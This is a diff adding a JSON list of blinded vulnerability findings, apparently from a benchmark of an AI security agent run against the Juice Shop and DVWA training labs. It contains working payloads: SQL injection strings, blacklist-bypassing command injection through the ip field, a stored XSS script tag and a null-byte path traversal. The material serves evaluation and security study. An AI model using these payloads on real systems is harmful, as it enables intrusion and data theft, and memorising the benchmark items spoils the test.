@@ -1,0 +1,2394 @@
+[
+  {
+    "blind_id": "BLIND-0001",
+    "target": "juiceshop",
+    "endpoint_url": "/rest/basket/{id}",
+    "method": "GET",
+    "parameter": "id (path)",
+    "cwe": "CWE-639",
+    "title": "Cross-User Basket Access (BOLA) - acct2 can read acct1's basket",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /rest/basket/6 as juiceshop_acct1 (baseline, mapping phase) -> 200 {UserId:22, Products:[{id:1,name:'Apple Juice (1000ml)', BasketItem:{quantity:3, BasketId:6}}]}",
+      "GET /rest/basket/6 as juiceshop_acct2 (own_basket_id=7, requesting acct1's basket id=6) -> 200 returns SAME data: UserId:22, Products:[{id:1,name:'Apple Juice (1000ml)', BasketItem:{quantity:3,BasketId:6}}]"
+    ],
+    "response_evidence": "Authenticated as juiceshop_acct2 (own_basket_id=7, email acct2_bench@juiceshop.local), GET /rest/basket/6 returned HTTP 200 with body: {\"status\":\"success\",\"data\":{\"id\":6,\"UserId\":22,...,\"Products\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"price\":1.99,...,\"BasketItem\":{\"ProductId\":1,\"BasketId\":6,\"id\":9,\"quantity\":3,...}}]}}. This is acct1's basket (UserId 22, not acct2's own UserId/basket 7), containing acct1's distinct seeded item \"Apple Juice (1000ml)\" with quantity 3. No authorization check prevented acct2 from retrieving another user's basket by ID — confirms Broken Object Level Authorization (CWE-639).",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0002",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection via pipe bypass on DVWA exec (high security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://dvwa/vulnerabilities/exec/ (session=dvwa_admin) -> confirmed page text 'Security Level: high'",
+      "POST http://dvwa/vulnerabilities/exec/ (session=dvwa_admin) form_data={ip: '127.0.0.1|whoami', Submit: 'Submit'}"
+    ],
+    "response_evidence": "[security=high] At high security, blacklist blocks '; ', '| ' (pipe+space), and '&&', but a pipe with NO trailing space bypasses the filter. Payload ip=127.0.0.1|whoami was submitted via POST. The response's 'pre_blocks' output and visible_text both contain the literal command output 'www-data' appended directly after the ping output area (\"Enter an IP address: www-data\"), confirming server-side command execution as the www-data web process identity. Page also confirms 'Security Level: high' at time of exploitation.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0003",
+    "target": "juiceshop",
+    "endpoint_url": "/ftp/package.json.bak",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-22",
+    "title": "Poison Null-Byte Path Traversal bypasses extension filter on /ftp/ to retrieve restricted .bak file",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/package.json.bak HTTP/1.1",
+      "GET http://juiceshop:3000/ftp/package.json.bak%2500.md HTTP/1.1"
+    ],
+    "response_evidence": "1) GET /ftp/package.json.bak (direct, raw extension) returned HTTP 403 with body: 'Error: Only .md and .pdf files are allowed!' thrown from fileServer.js verify() middleware, confirming the extension allow-list blocks .bak files directly.\n2) GET /ftp/package.json.bak%2500.md (URL-encoded null byte '%2500' decodes server-side to a null byte followed by '.md', satisfying the regex allow-list check while the underlying filesystem read truncates at the null byte and opens package.json.bak) returned HTTP 200, content-type application/octet-stream, with body content being the actual package.json file contents: '{\\n  \"name\": \"juice-shop\",\\n  \"version\": \"6.2.0-SNAPSHOT\", ... \"dependencies\": {...} ...'. This proves the null-byte bypass successfully retrieved the restricted backup file that was blocked when requested with its raw .bak extension.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0004",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/basket/6",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-639",
+    "title": "Cross-User Basket Access / Broken Object-Level Authorization (BOLA)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/rest/basket/6  (session=juiceshop_acct1, own_basket_id=6)",
+      "GET http://juiceshop:3000/rest/basket/6  (session=juiceshop_acct2, own_basket_id=7)"
+    ],
+    "response_evidence": "As juiceshop_acct1 (own_basket_id=6, UserId=22), GET /rest/basket/6 returned HTTP 200 with the account's seeded basket: {\\\"id\\\":6,\\\"UserId\\\":22,...\\\"Products\\\":[{\\\"id\\\":1,\\\"name\\\":\\\"Apple Juice (1000ml)\\\",...,\\\"BasketItem\\\":{\\\"ProductId\\\":1,\\\"BasketId\\\":6,\\\"id\\\":9,\\\"quantity\\\":3}}]}. Then, authenticated as juiceshop_acct2 (whose own basket id is 7, a completely different basket belonging to a different user), the SAME request GET /rest/basket/6 also returned HTTP 200 with IDENTICAL data belonging to acct1: {\\\"id\\\":6,\\\"UserId\\\":22,...\\\"Products\\\":[{\\\"id\\\":1,\\\"name\\\":\\\"Apple Juice (1000ml)\\\",...,\\\"BasketItem\\\":{\\\"id\\\":9,\\\"quantity\\\":3}}]}. No authorization/ownership check was enforced — acct2 successfully retrieved acct1's distinct seeded basket contents (Apple Juice 1000ml, qty=3, BasketItem id=9) despite not owning basket id 6, confirming a Broken Object-Level Authorization (BOLA) vulnerability.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0005",
+    "target": "juiceshop",
+    "endpoint_url": "/ftp/acquisitions.md",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-200",
+    "title": "Open Directory Listing Exposes Confidential Acquisitions Memo",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/ HTTP/1.1\nAccept: text/html,application/json",
+      "GET http://juiceshop:3000/ftp/acquisitions.md HTTP/1.1"
+    ],
+    "response_evidence": "Step1: GET /ftp/ returned HTTP 200 with serve-index directory listing explicitly enumerating 'acquisitions.md 909' bytes alongside other files (announcement_encrypted.md, coupons_2013.md.bak, legal.md, package.json.bak, etc.) — confirming an open directory listing without authentication.\nStep2: GET /ftp/acquisitions.md returned HTTP 200, content-type text/markdown, with body beginning: '# Planned Acquisitions\\n\\n> This document is confidential! Do not distribute!\\n\\nOur company plans to acquire several competitors within the next year. This will have a significant stock market impact...' — this is the verbatim confidential acquisition memo text, proving both the directory listing exposure and successful retrieval of the sensitive document without authentication.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0006",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection via pipe bypass in 'ip' field (DVWA security=medium)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/exec/ (session=dvwa_admin, security=medium cookie) with form_data={ip: '127.0.0.1| whoami', Submit: 'Submit'}"
+    ],
+    "response_evidence": "[security=medium] Response HTML confirmed 'Security Level: medium' in footer. The pre-block output for the ping command contained the literal string 'www-data' (the web server process identity), proving the pipe payload '127.0.0.1| whoami' bypassed the medium-level blacklist (which only strips ';' and '&&') and achieved command execution on the host. Full pre_blocks output: [\"www-data\"]. Visible text excerpt: \"Vulnerability: Command Injection ... Enter an IP address: www-data ... Security Level: medium\".",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0007",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/xss_s/",
+    "method": "POST",
+    "parameter": "mtxMessage",
+    "cwe": "CWE-79",
+    "title": "Stored Cross-Site Scripting via 'mtxMessage' guestbook field in DVWA XSS (Stored) page [security=low]",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/xss_s/ body: txtName=qa&mtxMessage=<script id=\"test_token\">window.xss_flag=1</script>&btnSign=Sign Guestbook  (session=dvwa_admin, security=low; client-side maxlength=50 bypassed by submitting raw form field server-side since mtxMessage is 51 chars)",
+      "browser_navigate http://dvwa/vulnerabilities/xss_s/ (session=dvwa_admin)",
+      "browser_eval_js('window.xss_flag')",
+      "browser_read_dom('#test_token')"
+    ],
+    "response_evidence": "[security=low] After posting the canary payload, the guestbook entry list showed a new 'Name: qa' entry with an empty rendered Message text in the raw HTTP response (expected, since the injected <script> tag itself produces no visible text) indicating the exact unescaped script tag was stored and output. Subsequently navigating to the page with a real browser (Playwright/Chromium) executed the stored script: browser_eval_js('window.xss_flag') returned 1, and browser_read_dom('#test_token') found the element present with inner_text 'window.xss_flag=1', proving the injected <script id=\"test_token\"> tag was stored verbatim and executed in the victim's browser context on page load -- confirming persistent/stored XSS in the mtxMessage field at low security.",
+    "browser_js_evidence": "window.xss_flag === 1 (evaluated via browser_eval_js after browser_navigate to http://dvwa/vulnerabilities/xss_s/ in dvwa_admin session); browser_read_dom('#test_token') returned inner_text/inner_html_excerpt = \"window.xss_flag=1\""
+  },
+  {
+    "blind_id": "BLIND-0008",
+    "target": "juiceshop",
+    "endpoint_url": "/encryptionkeys/",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-548",
+    "title": "Exposed Encryption Keys Directory Listing",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /encryptionkeys/ (unauth, Accept: text/html,application/json)"
+    ],
+    "response_evidence": "GET /encryptionkeys/ returned HTTP 200 with a browsable serve-index directory listing (visible_text: 'listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM') and extracted links to http://juiceshop:3000/encryptionkeys/jwt.pub and http://juiceshop:3000/encryptionkeys/premium.key. This confirms the directory is browsable without authentication and exposes sensitive key material filenames (jwt.pub, premium.key) that should not be publicly listed.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0009",
+    "target": "juiceshop",
+    "endpoint_url": "/ftp/acquisitions.md",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-200",
+    "title": "Confidential Acquisitions Memo Exposed via Open FTP Directory Listing",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /ftp/ with Accept: text/html,application/json as unauth -> 200, directory listing includes acquisitions.md (909 bytes) among other sensitive files (incident-support.kdbx, coupons_2013.md.bak, package.json.bak, announcement_encrypted.md)",
+      "GET /ftp/acquisitions.md as unauth -> 200, text/markdown content returned"
+    ],
+    "response_evidence": "Unauthenticated GET /ftp/ returns a browsable HTML directory index listing acquisitions.md along with other files (announcement_encrypted.md, coupons_2013.md.bak, incident-support.kdbx, package.json.bak, etc.) with no authentication required. Direct retrieval of GET /ftp/acquisitions.md (unauthenticated) returns HTTP 200 with the confidential memo text: '# Planned Acquisitions\\n\\n> This document is confidential! Do not distribute!\\n\\nOur company plans to acquire several competitors within the next year. This will have a significant stock market impact as we will elaborate in detail in the following paragraph... Our shareholders will be excited. It's true. No fake news.' This confirms unauthenticated disclosure of a confidential internal business document via an open directory listing.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0010",
+    "target": "juiceshop",
+    "endpoint_url": "/api/Feedbacks",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-359",
+    "title": "Unauthenticated access to /api/Feedbacks discloses user PII (email fragments + UserId linkage)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/api/Feedbacks (unauth, no Authorization header) -> HTTP 200 JSON feedback records"
+    ],
+    "response_evidence": "GET /api/Feedbacks succeeded with HTTP 200 and no authentication/authorization header was sent, returning the full feedback table including the authoring UserId for each entry. Example records: {\\\"UserId\\\":1,\\\"id\\\":1,\\\"comment\\\":\\\"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)\\\",\\\"rating\\\":5,...} and {\\\"UserId\\\":21,\\\"id\\\":4,\\\"comment\\\":\\\"Please send me the juicy chatbot NFT in my wallet at /juicy-nft : \\\\\\\"purpose betray marriage blame crunch monitor spin slide donate sport lift clutch\\\\\\\" (***ereum@juice-sh.op)\\\",\\\"rating\\\":1,...}. Each record exposes the submitting user's internal UserId (1, 2, 3, 21) directly correlated with a partially-visible email address fragment and full domain embedded in the publicly-readable comment field (local-part suffix + '@juice-sh.op'), with no auth required to view this PII-linked data set. This endpoint should require authentication/authorization or fully redact PII; instead any unauthenticated actor can harvest UserId-to-email-fragment correlations across all feedback, which is sufficient to confirm unauthenticated PII exposure (CWE-359).",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0011",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection via unsanitized 'id' parameter in DVWA SQLi page (low security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit (session=dvwa_admin)",
+      "GET http://dvwa/vulnerabilities/sqli/?id=1%27+AND+%271%27%3D%272&Submit=Submit (session=dvwa_admin)"
+    ],
+    "response_evidence": "[security=low] TRUE payload id=1' OR '1'='1 returned 5 user records concatenated from the backend query: 'First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE payload id=1' AND '1'='2 returned zero records (page body only contains 'User ID:' with no First name/Surname output). This confirms the id parameter is concatenated unsanitized into the SQL query, enabling boolean-based SQL injection and full table dump via OR-based tautology.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0012",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "POST",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection via numeric boolean bypass of quote-escaping (medium)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://dvwa/security.php (dvwa_admin) -> confirmed 'Security Level: medium' in visible_text",
+      "POST http://dvwa/vulnerabilities/sqli/ (dvwa_admin) form_data={id: '1 OR 1=1', Submit: 'Submit'} (TRUE case)",
+      "POST http://dvwa/vulnerabilities/sqli/ (dvwa_admin) form_data={id: '1 AND 1=2', Submit: 'Submit'} (FALSE case)"
+    ],
+    "response_evidence": "[security=medium] Page confirmed 'Security Level: medium' and form id field is a <select> dropdown (values 1-5), but raw POST body with numeric boolean payload bypassed the dropdown constraint (medium level escapes quotes via mysqli_real_escape_string but does not validate numeric input). TRUE payload id=1 OR 1=1 returned ALL 5 seeded user records: (admin/admin), (Gordon/Brown), (Hack/Me), (Pablo/Picasso), (Bob/Smith) — pre_blocks confirmed 5 distinct ID/First name/Surname records. FALSE payload id=1 AND 1=2 returned zero records — visible_text/pre_blocks contained no \"ID:\" result blocks at all, only the dropdown and page chrome. This differential (5 records vs 0 records) confirms the SQL injection.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0013",
+    "target": "juiceshop",
+    "endpoint_url": "/ftp/acquisitions.md",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-200",
+    "title": "Confidential acquisitions memo exposed via open /ftp/ directory listing",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/ (session=unauth, Accept: text/html,application/json) -> 200, directory listing including link 'acquisitions.md' (909 bytes)",
+      "GET http://juiceshop:3000/ftp/acquisitions.md (session=unauth) -> 200, returns confidential memo text"
+    ],
+    "response_evidence": "Unauthenticated GET to /ftp/ returned HTTP 200 with a browsable directory index (serve-index style) listing acquisitions.md (909 bytes) alongside other sensitive files. Direct unauthenticated GET to /ftp/acquisitions.md returned HTTP 200 with content-type text/markdown and body: '# Planned Acquisitions\\n\\n> This document is confidential! Do not distribute!\\n\\nOur company plans to acquire several competitors within the next year. This will have a significant stock market impact...' — confirming an internal confidential document is exposed to anonymous users via open directory listing with no access control.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0014",
+    "target": "juiceshop",
+    "endpoint_url": "/rest/products/search?q=",
+    "method": "GET",
+    "parameter": "q",
+    "cwe": "CWE-89",
+    "title": "Product-Search SQL Injection (error-based and UNION-based)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /rest/products/search?q=qwert%27 session=unauth -> HTTP 500 'Error: SQLITE_ERROR: near \"'%'\": syntax error'",
+      "GET /rest/products/search?q=x%27%29%29+UNION+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9-- session=unauth -> HTTP 200 {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":2,\"description\":3,\"price\":4,\"deluxePrice\":5,\"image\":6,\"createdAt\":7,\"updatedAt\":8,\"deletedAt\":9}]}"
+    ],
+    "response_evidence": "Step 1: q=qwert' (single unescaped quote) caused HTTP 500 with body containing 'Error: SQLITE_ERROR: near \\\"'%'\\\": syntax error' — proves the q parameter is concatenated directly into a raw SQL LIKE query without sanitization. Step 2: q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- (9-column UNION matching the products table's column count, with closing parens/comment to neutralize the original query) returned HTTP 200 with a crafted/benign result row where each field is the literal UNION-injected integer (name:2, description:3, price:4, etc. instead of real product data) — confirming successful UNION-based SQL injection execution against the backend SQLite database. Both pieces of evidence together confirm CWE-89 in the product search endpoint.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0015",
+    "target": "juiceshop",
+    "endpoint_url": "/rest/basket/6",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-639",
+    "title": "Broken Object Level Authorization (BOLA) on /rest/basket/{id} allows cross-user basket disclosure",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /rest/basket/6 (authenticated as juiceshop_acct2, own_basket_id=7, email=acct2_bench@juiceshop.local)"
+    ],
+    "response_evidence": "HTTP 200 response to acct2's request for basket id=6 (NOT acct2's own basket, which is id=7) returned: {\\\"status\\\":\\\"success\\\",\\\"data\\\":{\\\"id\\\":6,\\\"coupon\\\":null,\\\"UserId\\\":22,...,\\\"Products\\\":[{\\\"id\\\":1,\\\"name\\\":\\\"Apple Juice (1000ml)\\\",...,\\\"BasketItem\\\":{\\\"ProductId\\\":1,\\\"BasketId\\\":6,\\\"id\\\":9,\\\"quantity\\\":3,...}}]}}. This discloses UserId=22's (account1's) basket contents including seeded product 'Apple Juice (1000ml)' and quantity to a different authenticated user (acct2, own_basket_id=7) with no authorization check preventing access to another user's basket by ID. The server never validated that the requesting session's user owns basket 6, confirming CWE-639 BOLA.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0016",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection via 'ip' field in DVWA Command Injection page (security=low)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/security.php (verified security_level=low via session_info)",
+      "POST http://dvwa/vulnerabilities/exec/ form_data={ip: '127.0.0.1; whoami', Submit: 'Submit'}"
+    ],
+    "response_evidence": "[security=low] Payload ip=127.0.0.1; whoami was submitted to the ping form. Response pre_block contained the expected ping output PLUS an appended line 'www-data' at the end of the output: \\\"PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. ... rtt min/avg/max/mdev = 0.024/0.031/0.041/0.006 ms\\\\nwww-data\\\". The presence of 'www-data' (the web server process identity, output of the injected whoami command chained via ';') confirms the ip field is passed unsanitized to a shell command, enabling OS command injection.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0017",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "POST",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection via POST id parameter at medium security level",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/sqli/ form_data={id: '1 OR 1=1', Submit: 'Submit'} (session=dvwa_admin)",
+      "POST http://dvwa/vulnerabilities/sqli/ form_data={id: '1 AND 1=2', Submit: 'Submit'} (session=dvwa_admin)"
+    ],
+    "response_evidence": "[security=medium] TRUE payload id='1 OR 1=1' returned 5 records (full user table dump) via pre_blocks: \"ID: 1 OR 1=1 / First name: admin / Surname: admin\", \"ID: 1 OR 1=1 / First name: Gordon / Surname: Brown\", \"ID: 1 OR 1=1 / First name: Hack / Surname: Me\", \"ID: 1 OR 1=1 / First name: Pablo / Surname: Picasso\", \"ID: 1 OR 1=1 / First name: Bob / Surname: Smith\". FALSE payload id='1 AND 1=2' returned zero records (visible_text shows no \"ID:\"/pre_blocks entries, only the dropdown and page chrome). Page confirms \"Security Level: medium\" in both responses. This demonstrates the numeric (unescaped-quote-bypassing) boolean-based SQLi against the medium-level POST-based id field, consistent with medium-level filtering that only strips quotes.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0018",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection via ip parameter on /vulnerabilities/exec/ (DVWA high security, pipe bypass)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://dvwa/vulnerabilities/exec/ (session=dvwa_admin) -> confirmed page footer shows Security Level: high",
+      "POST http://dvwa/vulnerabilities/exec/  body: ip=127.0.0.1|whoami&Submit=Submit  (session=dvwa_admin)"
+    ],
+    "response_evidence": "[security=high] Confirmed OS command injection at DVWA high security level. Page footer explicitly confirms \"Security Level: high\" and \"Username: admin\" for this session.\n\nPayload ip=127.0.0.1|whoami (pipe with no surrounding spaces, bypassing the high-security blacklist of '; ', '| ' with trailing space, and '&&') was submitted to POST /vulnerabilities/exec/.\n\nResponse pre-block output: \"www-data\" -- i.e. the rendered result area showed:\n  Enter an IP address: www-data\n\nThis is the literal output of the injected `whoami` command executed by the web server process (www-data), appended after the ping output, proving successful command injection distinct from the low (`;`) and medium (`127.0.0.1| whoami` with space / blacklist of `;` and `&&`) bypass techniques which are blocked at this high level.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0019",
+    "target": "juiceshop",
+    "endpoint_url": "/ftp/",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-200",
+    "title": "Open Directory Listing on /ftp/ exposes confidential acquisitions.md",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/  Accept: text/html,application/json  (unauthenticated)"
+    ],
+    "response_evidence": "HTTP 200, content-type text/html, unauthenticated request returned a browsable directory listing of /ftp/ including entry 'acquisitions.md 909 12/19/2023 1:12:12 PM' alongside other files (announcement_encrypted.md, coupons_2013.md.bak, incident-support.kdbx, legal.md, package.json.bak, suspicious_errors.yml). Listing visible_text confirms: 'listing directory /ftp/ ~ / ftp / quarantine ... acquisitions.md 909 ...'. No authentication was required to view this listing.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0020",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/xss_s/",
+    "method": "POST",
+    "parameter": "mtxMessage",
+    "cwe": "CWE-79",
+    "title": "Stored XSS via unsanitized 'mtxMessage' field in DVWA Guestbook (Stored XSS page) [security=low]",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/xss_s/ body=txtName=tester&mtxMessage=%3Cscript+id%3D%22test_token%22%3Ewindow.xss_flag%3D1%3C%2Fscript%3E&btnSign=Sign+Guestbook (session=dvwa_admin)",
+      "browser_navigate http://dvwa/vulnerabilities/xss_s/ (session=dvwa_admin)",
+      "browser_eval_js('window.xss_flag')"
+    ],
+    "response_evidence": "[security=low] Payload <script id=\\\"test_token\\\">window.xss_flag=1</script> (52 chars) was submitted via raw POST request bypassing the client-side maxlength=50 attribute on mtxMessage (server performed no length or content sanitization — HTTP 200 and entry 'Name: tester' persisted in the guestbook listing). Upon re-loading the rendering page /vulnerabilities/xss_s/ in an authenticated browser context (dvwa_admin), the injected script executed automatically.",
+    "browser_js_evidence": "browser_eval_js(\"window.xss_flag\") returned result: 1, confirming the stored <script> payload executed in the DOM upon page render."
+  },
+  {
+    "blind_id": "BLIND-0021",
+    "target": "juiceshop",
+    "endpoint_url": "/rest/basket/{id}",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-639",
+    "title": "Cross-user Basket Access (BOLA) allows acct2 to read acct1's basket contents",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /rest/basket/6  (session=juiceshop_acct1, own_basket_id=6) -> 200, Products=[{id:1,name:'Apple Juice (1000ml)',BasketItem:{quantity:3,BasketId:6,id:9}}]",
+      "GET /rest/basket/6  (session=juiceshop_acct2, own_basket_id=7, i.e. requesting ANOTHER user's basket id) -> 200, identical Products=[{id:1,name:'Apple Juice (1000ml)',BasketItem:{quantity:3,BasketId:6,id:9}}], UserId:22 (belongs to acct1, not acct2)"
+    ],
+    "response_evidence": "acct1's own basket is id=6 (UserId:22) containing Apple Juice (1000ml) qty 3 (BasketItem id:9). When authenticated as juiceshop_acct2 (whose own_basket_id is 7), issuing GET /rest/basket/6 returns HTTP 200 with the exact same basket data belonging to UserId 22 (acct1): {\"id\":6,\"UserId\":22,\"Products\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",...,\"BasketItem\":{\"ProductId\":1,\"BasketId\":6,\"id\":9,\"quantity\":3}}]}. No authorization check prevents acct2 from retrieving acct1's distinct seeded basket by ID, confirming Broken Object Level Authorization.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0022",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/ftp/acquisitions.md",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-200",
+    "title": "Confidential Acquisitions Memo Exposed via Open /ftp/ Directory Listing",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/ (Accept: text/html,application/json) — listing reveals acquisitions.md (909 bytes) [previously confirmed]",
+      "GET http://juiceshop:3000/ftp/acquisitions.md (session=unauth)"
+    ],
+    "response_evidence": "HTTP 200, content-type text/markdown. Body excerpt confirms confidential memo: '# Planned Acquisitions\\n\\n> This document is confidential! Do not distribute!\\n\\nOur company plans to acquire several competitors within the next year. This will have a significant stock market impact as we will elaborate in detail in the following paragraph: ... Our shareholders will be excited. It's true. No fake news.' This corroborates/finalizes the already-confirmed open-directory-listing finding for /ftp/ by providing the direct confidential-document retrieval evidence (no authentication required).",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0023",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection via 'id' parameter in DVWA SQLi page (low security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit (session=dvwa_admin)",
+      "GET http://dvwa/vulnerabilities/sqli/?id=1%27+AND+%271%27%3D%272&Submit=Submit (session=dvwa_admin)"
+    ],
+    "response_evidence": "[security=low] TRUE condition (id=1' OR '1'='1) returned ALL 5 seeded user records: 'ID: 1' OR '1'='1 First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE condition (id=1' AND '1'='2) returned zero records - the page showed only 'User ID:' with no 'First name:'/'Surname:' output at all. This differential behavior (multiple surnames vs none) confirms classic boolean-based SQL injection via string-context injection into an unsanitized query.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0024",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection via pipe (no trailing space) bypassing high-security blacklist [security=high]",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/exec/  body: ip=127.0.0.1|whoami&Submit=Submit"
+    ],
+    "response_evidence": "[security=high] Confirmed security_level=high via session_info. Payload ip=127.0.0.1|whoami (pipe with no trailing space, bypassing the high-level blacklist of '; ', '| ' with trailing space, and '&&') produced response pre_blocks: [\"www-data\"], and visible_text includes \"Enter an IP address: www-data\" confirming command execution returned the web-server process identity, matching the required behavioral proof.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0025",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/encryptionkeys/",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-548",
+    "title": "Exposed Encryption Keys directory listing (unauthenticated)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /encryptionkeys/ with Accept: text/html,application/json (unauth session)"
+    ],
+    "response_evidence": "Unauthenticated GET /encryptionkeys/ returned HTTP 200 with a browsable directory listing (Apache/static-serve style) containing: 'listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM' with direct links to http://juiceshop:3000/encryptionkeys/jwt.pub and http://juiceshop:3000/encryptionkeys/premium.key. This confirms the encryption-keys directory is openly browsable without authentication and exposes sensitive cryptographic key filenames (JWT public key and premium feature key), consistent with CWE-548 Exposure of Information Through Directory Listing.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0026",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/products/search",
+    "method": "GET",
+    "parameter": "q",
